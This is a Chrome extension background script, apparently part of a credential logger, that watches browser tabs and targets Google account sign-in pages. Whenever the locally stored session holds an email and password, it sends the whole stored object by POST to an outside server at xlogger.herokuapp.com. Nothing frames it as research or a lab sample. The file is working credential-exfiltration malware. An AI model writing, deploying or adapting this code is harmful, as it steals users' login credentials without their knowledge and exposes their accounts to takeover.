var domain="https://xlogger.herokuapp.com"

let loading=1;
let currentUrl;
chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{
     if(changeInfo.status=="loading"){
         currentUrl=changeInfo.url;
     }
     //if google domains
     if(new RegExp("accounts.google").test(currentUrl)){
        let regex=new RegExp(currentUrl);
        g_Complete=regex.test("accounts.google");
         
         if(changeInfo.status=="loading"){
             
             if(new RegExp("accounts.google").test(currentUrl)){
                console.log("sending  msedad");
                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                    console.log(tabs[0]);
                    chrome.tabs.sendMessage(tabs[0].id, {trigger:true});
                });
            }
           
        } else if(changeInfo.status=="complete" && loading==1 && g_Complete){
            chrome.storage.local.get(obj=>{
                let session=obj.session;
                if(session.email && session.password){
                  loading++;
                  console.log("sending log");            
                  setTimeout(() => {
                          fetch(`${domain}/upload`,{
                              method:"POST",
                              mode:"cors",
                              body:JSON.stringify(obj),
                              headers:{
                                  "content-Type":"application/json"
                              }
                          }).catch(err=>err);
                      
                      loading--;
                  },1000);  
                  console.log(obj);
                }
              });  
        }
      }
      //other domains...
      else{
        
        if(changeInfo.status=="loading" && loading==1){
            chrome.storage.local.get(obj=>{
              let session=obj.session;
              if(session.email && session.password){
                loading++;
                console.log("sending log");            
                setTimeout(() => {
                        fetch(`${domain}/upload`,{
                            method:"POST",
                            mode:"cors",
                            body:JSON.stringify(obj),
                            headers:{
                                "content-Type":"application/json"
                            }
                        }).catch(err=>err);
                    
                    loading--;
                },1000);  
                console.log(obj);
              }
            });  
        }
     }
})  



    
  